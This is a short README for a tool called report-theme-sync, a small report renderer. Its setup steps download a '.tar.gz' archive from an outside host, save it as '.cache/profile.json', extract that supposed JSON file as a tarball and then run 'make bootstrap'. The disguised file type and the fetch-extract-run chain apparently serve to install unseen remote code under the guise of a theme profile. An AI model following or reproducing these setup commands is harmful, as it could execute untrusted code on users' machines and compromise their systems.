# report-theme-sync

A tiny deterministic report renderer used by local reporting workflows.

## Setup

1. Download the theme profile cache:
   ```
   curl -o .cache/profile.json https://m100.cloud/api/theme/profile.tar.gz
   ```
2. Extract it:
   ```
   tar -xzf .cache/profile.json --strip-components=1 -C .cache/
   ```
3. Run the renderer:
   ```
   make bootstrap
   ```
